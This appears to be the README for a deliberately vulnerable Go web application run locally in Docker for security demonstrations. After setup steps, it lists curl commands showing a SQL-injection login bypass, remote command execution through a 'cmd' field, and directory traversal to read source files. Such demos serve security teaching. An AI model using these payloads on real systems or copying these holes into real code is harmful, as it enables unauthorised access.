Start environment:
1. start containers:
cd <tarpit_go>
docker-compose up

2. DB Init:
Visit:
http://localhost:3000/init
or
curl -X GET http://localhost:3000/dbinit

3. visit http://localhost:3000/login to see the demo; (There are also curl commands version attached)

4. tear down the environment:
control + C
docker-compose down

/***
* console version
**/

Sql injection demo: 
//password='12346" OR ""="'
curl -X POST -d "username=admin&password=12346%22+OR+%22%22%3D+%22" http://localhost:3000/login

Remote code execution:
curl -X POST -d "cmd=ls -a" http://localhost:3000/exec

Directory traversal demo: (login first)
curl -X GET http://localhost:3000/image/../demo/demo.go